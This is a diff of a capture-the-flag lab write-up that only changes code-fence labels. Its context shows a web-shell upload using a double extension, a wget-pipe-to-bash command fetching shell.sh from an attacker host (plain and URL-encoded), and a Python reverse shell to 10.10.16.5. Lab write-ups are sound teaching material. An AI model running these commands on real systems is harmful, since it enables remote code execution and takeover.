@@ -57,11 +57,11 @@ mv file.jpg file.php.jpg
 http://10.10.10.185/images/uploads/3.php.png?cmd=wget -O - http://10.10.16.5:1234/shell.sh | bash
 ```
  *don't forget to use burp to encode "wget -O - http://10.10.16.5:1234/shell.sh | bash"*
-```console
+```url
 http://10.10.10.185/images/uploads/3.php.png?cmd=%77%67%65%74%20%2d%4f%20%2d%20%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%36%2e%35%3a%31%32%33%34%2f%73%68%65%6c%6c%2e%73%68%20%7c%20%62%61%73%68
 ```
 Create file *shell.sh*
-```console
+```sh
 if command -v python > /dev/null 2>&1; then
         python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.16.5",5555)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
         exit;
